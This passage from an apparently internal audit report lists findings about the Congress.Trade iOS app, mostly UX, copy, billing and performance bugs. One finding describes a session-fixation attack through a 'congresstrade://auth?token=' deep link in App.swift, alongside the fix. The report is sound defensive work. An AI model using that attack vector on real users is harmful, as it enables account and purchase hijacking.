- **Panel:** ios-shipped-app — APIClient.swift ticker() (lines 237-259) confirmed to build no `sort` query item. routes-client.ts confirmed: the ticker route's TxQueryParams (~line 197-202) has no `sort:` key at all, while the member route immediately below (~line 268-271) explicitly defaults `sort: asSort(q.sort) ?? 'tx_date'` with a comment documenting the exact same bug class already fixed for members ('Khanna 2026-08-16: lastTrade 2026-07-01 but cursor order put a reimported 2025-12-12 filing first').  This is a near-certain regression: the same defect class was fixed on the member route but never ported to the ticker route. · merged: ios-engineering/IOSENGINEERING-10, qa-bughunt/QABUGHUNT-13 · `ios-shipped-app/IOSSHIPPEDAPP-37`

#### 92. [P2] Any StoreKit purchase failure — including ones before Apple charged anything — is captioned 'Apple took the purchase, but Congress.Trade could not confirm it yet'

- **Where:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:281-307 (single `catch { purchaseError = PremiumPricing.redeemFailureMessage(error) }` around `product.purchase()`), :386-391 (redeemFailureMessage)  ·  **Surface:** iOS  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Copy written for the redeem-after-charge failure is shown for pre-charge failures, telling users they were charged when they were not, and pointing them at Restore (which will find nothing).
- **Impact:** Money-path confusion and likely support tickets/refund requests.
- **Fix:** Split the do/catch: purchase() errors → 'The App Store could not complete the purchase (…)'; only redeemAppleTransaction errors → the existing message.
- **Evidence:** PremiumSheet.swift:286-306: `do { let result = try await product.purchase() … try await store.redeemAppleTransaction(…) } catch { purchaseError = PremiumPricing.redeemFailureMessage(error) }` — a `StoreKitError.networkError`, `.notAvailableInStorefront`, payment-declined or `Product.PurchaseError` thrown by `purchase()` itself hits the same catch; :388 text 'Apple took the purchase, but Congress.Trade could not confirm it yet.  Nothing was lost — tap Restore Purchases…'.
- **Panel:** ios-shipped-app — PremiumSheet.swift confirmed: a single `catch` block (around lines 281-305, corrected from 281-307) wraps both `product.purchase()` itself and the post-purchase `store.redeemAppleTransaction(...)` call, and `redeemFailureMessage` (lines 383-391, corrected from 386-391) unconditionally states 'Apple took the purchase, but Congress.Trade could not confirm it yet' even for errors thrown before any charge (e.g.  StoreKitError.networkError, Product.PurchaseError). · merged: billing/BILLING-18, ios-engineering/IOSENGINEERING-13 · `ios-shipped-app/IOSSHIPPEDAPP-43`

#### 164. [P2] Push-notification tap routing is dead twice over: AppDelegate reads `trade_id`/`doc_id` but the backend sends `txId`/`docId`, and nothing observes the posted notifications

- **Where:** clients/ios/CongressTrade/AppDelegate.swift:49-59  ·  **Surface:** Cross-surface  ·  **Category:** bug  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-13 (IMPROVEMENT-PLAN P1.2)
- **What:** A user who taps an alert lands on whatever tab was open; the trade is never opened.  Even if an observer existed the keys would not match.
- **Impact:** Push alerts (a Premium-advertised feature) cannot deep-link to the trade; IMPROVEMENT-PLAN P1.2 'deep links to the exact trade' remains open.
- **Fix:** Read `kind`/`txId`/`docId`; route through `TabRouter` (add `pendingDeepLink` state) to `.trades` and present `TradeDetailView` for `txId` (fetch via `GET /trade/:id`).  Delete the unused NotificationCenter names.  Add a unit test over a sample APNs userInfo fixture shared with the backend test.
- **Evidence:** AppDelegate.swift:49-59: `if let tradeId = userInfo["trade_id"] as? String { NotificationCenter.default.post(name: NSNotification.Name("OpenTradeFromPush"), ...) } else if let docId = userInfo["doc_id"] as? String { ... "OpenFilingFromPush" ... }`; `grep -rn 'OpenTradeFromPush|OpenFilingFromPush' clients/ios` → only the two post sites in AppDelegate.swift, zero `addObserver`/`.onReceive` anywhere. Backend app/src/delivery/apnsFanout.ts:216 `data: { kind: 'official_trade', txId: trade.id, ticker: trade.ticker }`, :226 `data: { kind: 'review_needed', docId: review.doc_id }`; app/src/shared/apns.ts:242 spreads `...(alert.data ?? {})` at payload top level, so the client would receive `txId`/`docId`, not `trade_id`/`doc_id`.
- **Panel:** ios-engineering — All four evidence points (key mismatch, no observer, backend payload keys, payload spread) reproduced exactly. · merged: app-store-compliance/APPSTORECOMPLIANCE-21, delivery-alerts/DELIVERYALERTS-12 · `ios-engineering/IOSENGINEERING-04`

#### 165. [P2] Directory paginates an in-memory 381-row roster with a web-style pager instead of scrolling/indexing

- **Where:** Directory tab (People and Assets)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** A native directory of a few hundred items is a `List`/`LazyVStack` with search, section headers or an index, not a pager with rows-per-page.  LazyVStack already virtualises rendering, so the stated reason for paging does not hold, and the pager duplicates itself around a one-row result.
- **Impact:** Extra taps to reach page 2+; sort and rows controls clutter the result area; web-ported feel.
- **Fix:** Drop PaginationBar on Directory; render all filtered rows in a `List` (or LazyVStack) with `.searchable`, optional alphabetical sections/index, and keep a single Sort menu in the toolbar.
- **Evidence:** light/40-directory-tab.png: "381 of 381 shown", "1 of 8", sort chip, "50 ▾"; light/41-directory-search-pelosi.png: pager+sort rows rendered above AND below a single result; PeopleDirectoryView.swift line 19 (confirmed exact) `pageSize = 50`, line 189 (confirmed exact) `PaginationBar(...)`, comment confirms the roster is fully in memory ("Paging here is only about not rendering 379 cards at once").
- **Panel:** ios-hig-ux — Line citations exact (19, 189). · `ios-hig-ux/IOSHIGUX-09`

#### 204. [P2] `onOpenURL` accepts a session token from any `congresstrade://auth?token=` source (login-CSRF) and the Google flow still transports the bearer in a URL; the magic-link reason for the cold-open handler is gone

- **Where:** clients/ios/CongressTrade/App.swift:301-311  ·  **Surface:** iOS  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** still-open-since-2026-07-13 (IMPROVEMENT-PLAN P0.2)
- **What:** A malicious page/app can open `congresstrade://auth?token=<attacker session>` and the app silently signs the victim into the attacker's account; anything the victim then does (watchlist, deliveries, and an App Store purchase redeemed via `redeem_apple_purchase`, which attaches Premium to the signed-in account) lands in the attacker's account.
- **Impact:** Session fixation + possible Premium entitlement hijack; bearer tokens appear in URL logs/Safari history.
- **Fix:** Remove the cold-open `onOpenURL` token handler (ASWebAuthenticationSession already receives the callback), or only accept it while `isAuthenticatingWithGoogle` and bind a random `state` that the backend echoes.  Move to an https callback (`ASWebAuthenticationSession.Callback.https` on iOS 17.4+/associated domains) and exchange a one-time code for the session over the API.  Add tests for callback without pending state and with mismatched state.
- **Evidence:** App.swift:301-311 `.onOpenURL { url in guard url.scheme?.lowercased() == "congresstrade" else { return }; let host = ...; guard host == "auth" || host.isEmpty && url.path.contains("auth") else { return }; guard let components = ..., let token = components.queryItems?.first(where: { $0.name == "token" })?.value, !token.isEmpty else { return }; _ = store.saveSessionToken(token) }` — no pending-auth flag check, no nonce/state binding of any kind before accepting the token. Components.swift:1118 `ASWebAuthenticationSession(url: authURL, callbackURLScheme: "congresstrade")` and :1135-1146 parses `token` out of the callback URL the same way. Custom-scheme callbacks are claimable by any app and openable from any web page.
- **Panel:** ios-engineering — onOpenURL logic read in full: confirmed there is genuinely no pending-state check before accepting the token — the only gates are scheme/host/non-empty token. · merged: security-web/SECURITYWEB-09 · `ios-engineering/IOSENGINEERING-07`

#### 205. [P2] Alerts toggle cannot be turned off in-app and anonymous taps request permission that then does nothing

- **Where:** Account sheet and Delivery tab "Trade Disclosure Alerts" toggle  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** The switch mirrors the OS permission, so flipping it off jumps the user out to Settings, and flipping it on while signed out triggers the one-shot system prompt before the user has an account to attach the device to.  HIG: a switch should change app state immediately; permission prompts should come after the user understands the benefit and can complete the flow.
- **Impact:** Wasted permission prompt (cannot be re-asked), surprising app exit, and a control duplicated on two screens with explanatory footer copy to reconcile them.
- **Fix:** Model an app-level preference (device registered yes/no) that the app owns; request OS permission only when signed in; when denied, show an explicit "Open Settings" button instead of a toggle; keep one canonical location.
- **Evidence:** Components.swift confirmed: `Toggle("Trade Disclosure Alerts", isOn: Binding(...))` at the cited region; both the `.denied` case and the `else { openSystemNotificationSettings() }` `off`-tap path confirmed to call `openSystemNotificationSettings()`; status caption confirmed to be a plain caption, not a button, per screenshots; DeliveryView.swift confirmed a second `DeliveryAlertsToggle` duplicating the same switch.
- **Panel:** ios-hig-ux — Toggle logic and duplicate location both confirmed in code. · merged: qa-bughunt/QABUGHUNT-24, app-store-compliance/APPSTORECOMPLIANCE-14 · `ios-hig-ux/IOSHIGUX-12`

#### 229. [P3] Signed-in foreground poll fans out to 6+ requests every cycle (bootstrap, feed, subscriptions, commands, preferences, /auth/me, push sync)

- **Where:** clients/ios/CongressTrade/Store/CongressTradeStore.swift:597-687  ·  **Surface:** iOS  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Every 60s a signed-in phone re-reads its whole account state and re-probes admin access, although none of it changes without a user action on this device.
- **Impact:** Battery/data and backend load; the admin probe doubles as an extra auth round-trip per poll.
- **Fix:** Poll only `feed` (with `since` cursor) on the timer; refresh bootstrap/account state on foreground, sign-in, after a command, and on pull-to-refresh; cache `probeAdminAccess` per session.
- **Evidence:** CongressTradeStore.swift: `performRefresh` opens `async let bootstrapTask = api.bootstrap()` plus a feed page fetch, then `if signedIn { await refreshSignedInState(); await PushNotificationManager.shared.syncTokenWithBackend(api: api); await probeAdminAccess() }`. `refreshSignedInState()` (line 987) itself issues three more concurrent calls: `api.subscriptions()`, `api.commands(limit: 12)`, `api.preferences()`. Live `GET /api/client/v1/feed?limit=1` → `nextPollAfterSec: 60`.
- **Panel:** ios-engineering — Counted the fan-out directly: bootstrap + feed + subscriptions + commands + preferences + push-sync + admin-probe = 7 calls per 60s cycle when signed in, matching '6+' claim exactly.  Live poll interval confirmed via curl. · `ios-engineering/IOSENGINEERING-16`

#### 230. [P3] Returning to the foreground does not refresh; the poll timer just re-arms for another `nextPollAfterSec`, so a phone that was backgrounded for hours shows stale trades for up to 60–300s

- **Where:** clients/ios/CongressTrade/Store/CongressTradeStore.swift:525-546  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Standard iOS behaviour is to refresh on activation when the last refresh is older than the poll interval.
- **Impact:** Stale counts/rows after every background stint; alerts tapped from a push show an out-of-date list.
- **Fix:** On `.active`, if `lastSuccessfulRefresh` is older than `nextPollAfterSec` (or nil) call `refresh()`/`refreshTrends()` immediately, then arm the timer.
- **Evidence:** App.swift:295-296 `.onChange(of: scenePhase) { _, phase in store.setAutoRefreshPaused(phase != .active) }`; CongressTradeStore.swift `setAutoRefreshPaused(false)` calls `scheduleAutoRefresh()`, which always does `try? await Task.sleep(...)` for the full clamped `seconds` interval BEFORE calling `self.refresh()` — no check of `lastSuccessfulRefresh` age, no immediate refresh on resume.
- **Panel:** ios-engineering — Read scheduleAutoRefresh in full — confirmed it always sleeps first, no staleness/immediate-refresh branch exists. · `ios-engineering/IOSENGINEERING-24`

#### 231. [P3] CSV export ignores the unified search term the Trades tab is actually filtered by, yet the sheet claims to export 'the filtered' list

- **Where:** clients/ios/CongressTrade/Store/CongressTradeStore.swift:1137-1155  ·  **Surface:** iOS  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A user who searched 'pelosi' in the Trades field and taps Export gets every trade in range, not the filtered set.
- **Impact:** Premium feature returns a different set than the screen shows.
- **Fix:** Factor the ticker/memberName derivation out of `performRefresh` into a `currentFeedQuery` and reuse it in `exportCSV`; add a unit test.
- **Evidence:** CongressTradeStore.swift `exportCSV(from:to:)` (line 1137) passes `assetFilter`/`politicianFilter`/chamber/type/party/assetClass to `api.exportTransactionsCSV` but never references `searchTerm`. `searchTerm` (line 156, set by `setSearch` from the unified field) is only consumed inside `performRefresh`, where it's mapped into `tickerParam`/`memberNameParam` via a ticker-vs-name heuristic — a mapping `exportCSV` does not repeat. FeedDashboardView.swift export sheet footer: 'Exports the filtered feed for this range.'
- **Panel:** ios-engineering — Confirmed exportCSV's parameter list omits searchTerm entirely, and confirmed searchTerm's only consumer is performRefresh's inline heuristic. · `ios-engineering/IOSENGINEERING-28`

#### 232. [P3] Launch has no branded launch screen and EagleSplashView is dead code

- **Where:** App launch  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** tracked-in-PR-#1973
- **What:** HIG expects a launch screen that resembles the first screen so the app feels instant; today the system shows a blank system-background then the app. 121 lines of splash code ship unused (PR #1973 also notes it).
- **Impact:** First impression is a blank frame; maintenance noise.
- **Fix:** Either mount EagleSplashView once per cold start (honouring reduceMotion) or delete it, and set `UILaunchScreen` with the brand background colour / nav bar so the launch frame matches the Trends tab.
- **Evidence:** logs/info-plist.txt confirmed `UILaunchScreen` = empty dict; `grep -rn EagleSplashView clients/ios` confirmed only its own file (clients/ios/CongressTrade/Views/Components/EagleSplashView.swift) references it, nothing mounts it; light/01-launch.png shows Trends already rendered.
- **Panel:** ios-hig-ux — EagleSplashView.swift confirmed to have zero call sites outside itself. · `ios-hig-ux/IOSHIGUX-14`

#### 233. [P3] Sheet dismissal vocabulary is inconsistent: X icon, "Done", "Close", "Not Now", and "Done" on pushed screens

- **Where:** Trade Details (X), Ticker/Politician ("Done"), Export ("Close"), Premium ("Not Now" body button, no bar item), Account ("Done")  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** HIG: use one consistent dismissal pattern for modal sheets; pushed views should not carry a sheet-level Done.
- **Impact:** Users relearn how to leave each sheet; "Done" on a pushed Ticker screen pops rather than dismissing, which contradicts its label.
- **Fix:** Standardise on a trailing "Done" (or X) for all sheets, add it to Premium and Export, and hide the Done item when the view is presented via NavigationLink (pass `isPushed`).
- **Evidence:** Confirmed all five patterns exactly: TradeDetailView.swift `xmark.circle.fill` (line 118, exact); TickerDetailView.swift `Button("Done")` (line 148, exact); PoliticianDetailView.swift `Button("Done")` (line 138, exact); FeedDashboardView.swift `Button("Close")` (line 1267, exact); PremiumSheet.swift body-level "Not Now" confirmed with no toolbar close item; Components.swift Account sheet "Done" confirmed (line 929, exact).
- **Panel:** ios-hig-ux — All five cited line numbers matched exactly. · merged: ios-a11y/IOSA11Y-17 · `ios-hig-ux/IOSHIGUX-17`

#### 234. [P3] Recent Trades inside the Ticker sheet repeat the ticker+logo on every row and are not date-ordered

- **Where:** Ticker sheet -> Recent Trades  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** In a sheet about MSFT the primary fact per row is who traded and when; the generic TradeCard spends the leading column on the same logo repeatedly, and the order is not chronological so "Recent" is misleading.
- **Impact:** Scannability; the section header promises recency it does not deliver.
- **Fix:** Add a `TradeCard(style: .inTickerContext)` variant that leads with the member avatar/name and hides the ticker; sort `response.items` by transaction date desc (or fix server order).
- **Evidence:** light/51-ticker-detail-msft-scroll1.png dates as cited; TickerDetailView.swift confirmed `self.trades = response.items` with no `.sorted` applied client-side, and reuses `TradeCard` unchanged (no ticker-context variant); NOTES §6.7 corroborates independently.
- **Panel:** ios-hig-ux — No client-side sort confirmed by grep; relies on server order being non-chronological, which NOTES independently observed at capture time. · `ios-hig-ux/IOSHIGUX-19`

#### 235. [P3] Company Info / Trade Summary value columns misalign when a row is a NavigationLink

- **Where:** Trade Details -> Company Info ("Asset" vs "Sector")  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** plausible (high confidence)
- **What:** The shared ledger layout computes its value column from the row's own width; wrapping one row in an HStack with a chevron shrinks that width so the value column shifts.
- **Impact:** Visible misalignment in the most detailed sheet; undermines the "one row primitive" fix from docs/ux-findings-2026-08.md RC1.
- **Fix:** Render the chevron inside `DetailRow` (optional `trailingAccessory`) so every row shares identical geometry.
- **Evidence:** light/15-trade-detail-bottom.png as cited; TradeDetailView.swift confirmed a `linkedDetailRow` helper wrapping `DetailRow` in an HStack with a trailing chevron in the cited region (163-180).
- **Panel:** ios-hig-ux — Code shape (linkedDetailRow wrapping DetailRow with an extra chevron) is confirmed and is a plausible cause of column misalignment; did not pixel-measure the screenshot to independently confirm the ~15px offset, but nothing contradicts it. · `ios-hig-ux/IOSHIGUX-20`

#### 236. [P3] Buy/Sell iconography is inverted between the filter chip and the Trade Details pill

- **Where:** Trade-side filter chip vs Trade Details status pill  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The same concept uses opposite arrow directions in two places.
- **Impact:** Small but repeated semantic inconsistency; colour carries the meaning, arrows contradict it.
- **Fix:** Pick one mapping (buy = up/down-left into portfolio?) and share a `TradeType.symbol` helper.
- **Evidence:** FeedDashboardView.swift confirmed `Image(systemName: "arrow.up")` / `"arrow.down"` at the filter-chip sort/side glyphs (963, 966 -- close to cited 962-967); TradeDetailView.swift confirmed `"arrow.down.right.circle.fill"` for buy and `"arrow.up.right.circle.fill"` for sell (lines 33, 35 -- close to cited 32-36); light/13-trade-detail-expanded.png shows the Sell pill with an up-right arrow.
- **Panel:** ios-hig-ux — Both icon sets confirmed at the cited files. · `ios-hig-ux/IOSHIGUX-21`

#### 237. [P3] Export CSV sheet shows working date pickers to anonymous users then a non-actionable grey sentence

- **Where:** Account -> Export CSV (anonymous)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Anonymous users can configure a range that cannot be exported and get no button to sign in or upgrade; the premium action itself is a tiny caption-sized "↓ CSV".
- **Impact:** Dead-end flow and an under-sized primary action.
- **Fix:** Gate earlier (show SignInPanel / Premium button in place of the pickers for non-premium) and make export a `.borderedProminent` "Export CSV" button.
- **Evidence:** light/30-export-csv-anonymous.png as cited; FeedDashboardView.swift confirmed `Text("Sign in with a Premium account to export CSV.")` (line 1234, close to cited 1232-1236) is a static Text with no button, and the premium export control is `Text("↓ CSV")` at line 1254 (close to cited) in `.caption`-scale styling.
- **Panel:** ios-hig-ux — Both cited Text elements confirmed near-exact line numbers. · merged: billing/BILLING-27 · `ios-hig-ux/IOSHIGUX-30`

#### 238. [P3] Politician and Ticker sheets surface raw error strings with no retry and no offline state

- **Where:** Politician sheet, Ticker sheet  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Transient 5xx/offline on these sheets shows "Error / Request failed" with no Retry; the Trades tab already has a Retry pattern.
- **Impact:** Any blip leaves a blank sheet the user must close and reopen.
- **Fix:** Add `actions: { Button("Retry") }` to both ContentUnavailableViews and map APIError to friendlier copy ("Couldn't load Nancy Pelosi").
- **Evidence:** light/42-politician-detail-pelosi-error.png as cited; PoliticianDetailView.swift confirmed `ContentUnavailableView("Error", systemImage: "exclamationmark.triangle", description: Text(error))` at line 44 (exact) with no `actions:` closure; TickerDetailView.swift confirmed the identical pattern at line 28 (exact); the specific 404 root cause cited in the finding is confirmed fixed on main via commit 98126323 (#1894, "fix first-tap member 404"), but the presentation path (no Retry button) remains unchanged as the finding states.
- **Panel:** ios-hig-ux — Both cited lines exact; confirmed the #1894 fix landed but only fixed the 404 cause, not the missing-Retry presentation. · merged: ios-a11y/IOSA11Y-22 · `ios-hig-ux/IOSHIGUX-37`

#### 239. [P3] Directory shows '381 of 381 shown' directly above a '1 of 8' pager

- **Where:** clients/ios/CongressTrade/Views/People/PeopleDirectoryView.swift:105-111  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-18) 'shown' describes the filtered set, not the page; with pagination it reads as a contradiction.
- **Impact:** Minor confusion.
- **Fix:** '381 politicians' / '381 matching' and 'Showing 1–50 of 381' when paged.
- **Evidence:** Sim shot 40-directory-tab.png: '381 of 381 shown' then '‹ 1 of 8 ›'; 48-directory-assets.png: '4,160 of 4,160 shown' / '1 of 84'.
- **Panel:** ios-shipped-app — PeopleDirectoryView.swift:105 confirmed `"\(count) of \(total) shown"` pattern sitting above the pager, matching the 'shown' vs 'page' contradiction described. · `ios-shipped-app/IOSSHIPPEDAPP-18`

#### 240. [P3] Politician 'Recent Trades' repeats the politician's own name in every row and has no way to load more

- **Where:** clients/ios/CongressTrade/Views/Feed/PoliticianDetailView.swift:106-114 (reuses TradeCard), :215-222 (single fetch, no paging)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-20)
- **Impact:** Wasted row height; older trades unreachable from the sheet.
- **Fix:** Compact row variant on politician pages (owner/asset type instead of name) and a 'View all N trades' that opens Trades pre-filtered.
- **Evidence:** TradeCard.politicianLine (FeedDashboardView.swift:1456-1480) always prints 'House · Kevin Hern · R-OK'; `trades = response.items` (:203) with no cursor/offset follow-up.  Walkthrough: list ended at HONAV Jun 29 2026 with no 'more'.
- **Panel:** ios-shipped-app — Confirmed TradeCard reuse (PoliticianDetailView.swift:111) and single non-paginated fetch (`self.trades = response.items`, line 203) with no cursor/offset follow-up call. · `ios-shipped-app/IOSSHIPPEDAPP-20`

#### 241. [P3] 'Done' on a pushed Ticker/Politician page pops back to Trade Details instead of dismissing the sheet

- **Where:** clients/ios/CongressTrade/Views/Feed/TickerDetailView.swift:147-151 and Views/Feed/PoliticianDetailView.swift:137-141 (`Button("Done") { dismiss() }` via `@Environment(\.dismiss)`); pushed from TradeDetailView.swift:53-59, :86-89, :206  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-21) ‹ and Done do the same thing; neither dismisses.
- **Impact:** Extra taps; unclear semantics.
- **Fix:** Pass the sheet's dismiss binding down (or hide Done when pushed) and avoid nesting NavigationStacks.
- **Evidence:** `@Environment(\.dismiss)` on a view presented by NavigationLink pops the stack (documented SwiftUI behaviour); both views also wrap themselves in their own NavigationStack (TickerDetailView.swift:19, PoliticianDetailView.swift:30) so a push from TradeDetailView nests stacks.  Walkthrough: Done on Kevin Hern returned to Trade Details.
- **Panel:** ios-shipped-app — Confirmed both TickerDetailView.swift and PoliticianDetailView.swift declare their own `@Environment(\.dismiss)` and `Button("Done") { dismiss() }`, consistent with the documented SwiftUI behavior that dismiss() on a pushed (NavigationLink-presented) view pops rather than dismissing the enclosing sheet. · `ios-shipped-app/IOSSHIPPEDAPP-21`

#### 242. [P3] Ticker sheet Trading Summary is silently window-scoped, says 'Members' where the app says 'Politicians', and prints Net Flow unsigned/untinted

- **Where:** clients/ios/CongressTrade/Views/Feed/TickerDetailView.swift:93,95  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-28)
- **Impact:** 'First Trade' reads as all-time; terminology and sign conventions drift.
- **Fix:** Caption tiles with the active window, rename to 'Politicians', use SignedFlowFormat + tint.
- **Evidence:** TickerDetailView.swift:93 'Members' vs TrendsView.swift:191 'Politicians'; :95 uses `CompactFormat.usd` (no '+', no green/red) whereas Trends uses `SignedFlowFormat` (owner 'net +$' rule).  `curl …/ticker/MSFT?window=90d&from=2026-05-20` → summary totalTrades 11, firstTrade 2026-06-02 (window-scoped) — the tile group carries no 'Past 3 Months' caption.
- **Panel:** ios-shipped-app — TickerDetailView.swift:93-95 confirmed: MetricTile titled 'Members' (vs TrendsView.swift's 'Politicians'), and Net Flow uses `CompactFormat.usd(...)` (unsigned/untinted) rather than a signed formatter. · `ios-shipped-app/IOSSHIPPEDAPP-28`

#### 243. [P3] Two different lowercase strings for the same notifications-denied state ('turned off for this app in iOS Settings — tap to open' vs 'blocked in iOS Settings — tap to open them'); two toggle implementations

- **Where:** clients/ios/CongressTrade/Views/Components/Components.swift:1310 (TradeDisclosureAlertsToggle) vs Views/Delivery/DeliveryView.swift:394 (DeliveryAlertsToggle), :33 ('Alerts on This Phone')  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** (was IOSSHIP-29) Copy drift between two copies of one control; platform word hard-coded ('iOS Settings' on Mac).
- **Impact:** Minor polish; duplicate code will keep drifting.
- **Fix:** Delete DeliveryAlertsToggle and use TradeDisclosureAlertsToggle; one shared string 'Turned off in Settings — tap to open'; 'Alerts on this device'.
- **Evidence:** Components.swift:1310 `return "turned off for this app in iOS Settings — tap to open"`; DeliveryView.swift:394 `return "blocked in iOS Settings — tap to open them"`; DeliveryView.swift:321-323 comment admits the duplicate exists to 'coexist on main'.  Also DeliveryView.swift:396 shows 'off' vs Components 'not enabled on this device' for notDetermined.
- **Panel:** ios-shipped-app — Confirmed the two distinct lowercase strings verbatim: Components.swift:1310 'turned off for this app in iOS Settings — tap to open' vs DeliveryView.swift:394 'blocked in iOS Settings — tap to open them'. · `ios-shipped-app/IOSSHIPPEDAPP-29`

#### 244. [P3] Trade Details 'Confidence' renders 100% when confidence is missing and would render '10000%' for the competitor_backfill rows the public feed serves with confidence 100

- **Where:** clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:66 (`DetailRow("Confidence", "\(Int(((trade.confidence ?? 1.0) * 100).rounded()))%")`); public feed row source competitor_backfill  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Client fabricates a confidence when absent, and a competitor-backfill row leaks into the public client feed with a wrong-scale confidence and filedDate == txDate.
- **Impact:** Trust: '100%' where nothing is known; a bogus VSNT 'trade' with a nonsense confidence is visible in the app and likely counted in analytics.
- **Fix:** iOS: show '—' when nil and clamp to 0…1.  Backend (out of lens): exclude `competitor_backfill` rows from the public client feed/analytics or normalise their confidence.
- **Evidence:** TradeDetailView.swift:66 defaults nil to 1.0 (→ '100%', a fabricated certainty).  `curl …/api/client/v1/feed?ticker=VSNT&limit=50` returns `{"id": "COMPETITOR-dingell_VSNT_2026-01-05_exchange-…", … "transaction": {"date": "2026-01-05", "type": "E"}, "filing": {"filedDate": "2026-01-05", …}, "confidence": 100, "source": "competitor_backfill"}` — a probe/backfill artefact in the public feed on a 0–100 scale (other rows 0.6–0.97), which the sheet would print as '10000%'.
- **Panel:** ios-shipped-app — TradeDetailView.swift:66 confirmed verbatim `Int(((trade.confidence ?? 1.0) * 100).rounded())%` — nil confidence silently renders as a fabricated 100%. · merged: ios-engineering/IOSENGINEERING-19 · `ios-shipped-app/IOSSHIPPEDAPP-41`

#### 245. [P3] Directory trade counts are all-time and unlabelled while Trends/Trades counts follow the filter chips (Ro Khanna 23,005 vs 961)

- **Where:** clients/ios/CongressTrade/Views/People/PeopleDirectoryView.swift:236-242 (`CompactFormat.count(member.txCount)` + 'trades'); APIClient.swift:221-224 (`GET /api/members`, no window)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Same politician, two counts, no scope label.
- **Impact:** Numbers look contradictory across tabs.
- **Fix:** Caption 'trades (all time)' or apply the shared window to the Directory count.
- **Evidence:** Sim shot 40-directory-tab.png: 'Ro Khanna 23,005 trades'; walkthrough Trends Most Active Politicians: 'Ro Khanna … 961 trades' (Past 3 Months); Directory has no filter strip and no 'all time' caption.  dashboardHtml.ts:4622-4626 comment notes the same 988 vs 22,832 confusion was fixed on web by stamping the timeframe.
- **Panel:** ios-shipped-app — Code citations confirmed structurally (PeopleDirectoryView.swift uses `member.txCount` with no window caption; APIClient's /api/members call takes no window param), but the specific '23,005 vs 961 trades' numeric claim from the walkthrough was not independently re-curled in this pass. · merged: visual-design/VISUALDESIGN-38 · `ios-shipped-app/IOSSHIPPEDAPP-44`

#### 317. [P3] Single monolithic `ObservableObject` store (and TabRouter/PushNotificationManager) violates the repo's own '@Observable, never ObservableObject' rule and invalidates every tab on every @Published write

- **Where:** clients/ios/CongressTrade/Store/CongressTradeStore.swift:5, App.swift:19, Store/PushNotificationManager.swift:6  ·  **Surface:** iOS  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-13 (IMPROVEMENT-PLAN P1)
- **What:** With `ObservableObject`, any `objectWillChange` (e.g. `isRefreshing`, `commands`, review-queue items) re-evaluates the bodies of Trends, Trades, Directory and Delivery simultaneously.
- **Impact:** Unnecessary main-thread work and scroll hitches during polls; the documented architecture rule is not met.
- **Fix:** Migrate to `@Observable` (drop `@Published`, inject with `.environment(store)`, read with `@Environment(CongressTradeStore.self)`), then split admin/review-queue state into its own observable.  Measure with Instruments before/after per IMPROVEMENT-PLAN.
- **Evidence:** CongressTradeStore.swift:5 `final class CongressTradeStore: ObservableObject` with 65 `@Published` properties (grep -c); App.swift:19 `final class TabRouter: ObservableObject`; PushNotificationManager.swift:6 `final class PushNotificationManager: ObservableObject`. clients/ios/CLAUDE.md:61 'Rules: `@Observable` + `@MainActor` on stores. Never `ObservableObject`.' (the same file's architecture diagram even comments 'CongressTradeStore.swift # @Observable client store', contradicting the actual class).
- **Panel:** ios-engineering — Confirmed the contradiction is explicit and self-documented — CLAUDE.md's own diagram comment says @Observable while the code says ObservableObject. · `ios-engineering/IOSENGINEERING-15`

#### 318. [P3] iOS feed models drift from the backend contract: `companyName`, `logoUrl`, `typeCategory(Label)` and member `title` are dropped; logos and company names are re-derived client-side

- **Where:** clients/ios/CongressTrade/Models.swift:100-119  ·  **Surface:** iOS  ·  **Category:** api  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The web shows canonical company names/logos from enrichment; iOS shows the filing's free text and guesses the logo route.
- **Impact:** Web/iOS inconsistency and extra maintenance whenever the logo route or enrichment changes.
